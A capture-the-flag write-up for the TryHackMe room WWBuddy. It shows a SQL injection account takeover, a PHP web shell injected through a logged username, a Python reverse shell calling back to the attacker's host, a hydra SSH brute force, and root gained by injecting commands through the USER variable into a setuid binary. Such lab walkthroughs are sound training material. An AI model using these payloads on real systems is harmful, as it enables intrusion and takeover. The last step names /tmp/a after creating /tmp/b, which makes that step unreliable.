# Write up for WWBuddy on <a href='https://tryhackme.com/room/wwbuddy'>TryHackMe</a>

### Website Flag

The webpage gives us a login page, I tried for sql injection which didn't work. I registered an account and looked around I could only see **WWBuddy** user which looks like a bot.
There is a message saying that we can send message to any user that we can find on the webpage. I couldn't find anything interesting so I ran [ffuf](https://github.com/ffuf/ffuf).
<br></br><img src='./images/Screenshot (109).png' /><br></br>

We can see some interesting paths, if we visit the **/admin** we can get a messsage that we cannot access the service. If you visit the api you won't get anything interesting too.
Now we will try for sql injection, change the username.
<br></br><img src='./images/Screenshot (110).png' /><br></br>
*Note: Initially I tried **' or 1=1;-- -** but that gave an error*

Now let's reset password, I just used **password** as the password. After resetting the password logout and login with
#### WWBuddy:{The password you set}
After logging in as WWBuddy we can see that that are two more users,
<br></br><img src='./images/Screenshot (111).png' /><br></br>

Let's login as Roberto and Henry. We can see that they are talking the default password for ssh is the user's **date of birth** and there is a new employe at the company.
If we visit **/admin** as **Henry** we can see that it gives us a log of all the users that tried to access **/admin**.

See the source code and we get the first flag

### User Flag

It's a php file so let's try a php code in username and see if we can get a result.
Set username to `<?php echo exec($_GET['cmd']) ?>` from the sql injection that we had earlier or change username of any other user who is not Henry since Henry is admin, his username won't be reflected in the php file. Now visit the **/admin** adn then logout and visit **/admin** as Henry. We can see that the php code is not visible and now let's run the **i** command
<br></br><img src='./images/Screenshot (112).png' /><br></br>
Now we have code execution let's get a shell with that,
I used a python shell `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{YOUR IP}",{PORT NO}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`, url encode this and send it in the **cmd** parameter and we get a shell as **www-data**.
I enumerted the machine manually and found */var/www/html/config.php* which had the db creds but they weren't useful since all the passwords of every user was set to same and there was nothing useful in other tables too. So I ran linpeas and found **/var/log/mysql/general.log** which has logs of the mysql commands that were ran on the machine. If you look at the log you will see that Roberto entered his username and password in the username field. Get the password and we can get an ssh connection with those creds. The flag is in the **importante.txt**

### Root Flag
The text in the file is in some other language so we need to translate that to english with google translate.
<br></br><img src='./images/Screenshot (113).png' /><br></br>

The **importante.txt** file was created on Jul 27, 2020 and she is about to turn 26 so her birth month is gonna be **August** and birth year is **1994**,*(2020 - 26, we don't do 2020 - 25 because she turned 25 in 2019)*. Now we just need to guess the day of the month. The DOB format would be **mm/dd/yyyy**
Create a wordlist with **crunch**
#### crunch 10 10 08/%%/1994 -o pass.txt
After the wordlist is created we can use **hydra** to brute force
#### hydra -f -l jenny -P pass.txt ssh://{MACHINE IP}
We will get the password with this and login as jenny with it.
I ran linpeas as jenny and found something interesting
<br></br><img src='./images/Screenshot (114).png' /><br></br>

If you run the binary as robert you just get a message saying that you are already a developer but if you execute that binary as jenny we can see that we get a shell and if you run **id** command we can see that we are part of the developer group. Let's look at what the binary is doing. I copied the binary to my machine with scp
#### scp robert@{MACHINE IP}:/bin/authenticate .
*Enter the password when it prompts for it*
<br>
Open the binary in **ghidra** and we can see something very interesting.
<br></br><img src='./images/Screenshot (115).png' /><br></br>
**USER** env is taken and and **uid** is set to 0 which is **root**. We can see that the **USER** is concatenated to a variable and that is being executed with **system** as **root**. Now we can set **USER** env to to command and we can execute that as root.
#### export USER=';cp /bin/bash /tmp/b' (*There is a character limit*)
#### /bin/authenticate
Exit the shell and check the /tmp, there would be **b** file. Now change the permission
#### export USER=';chmod +xs /tmp/b'
#### /bin/authenticate
Exit and now run
#### /tmp/a -p
This will give a root shell
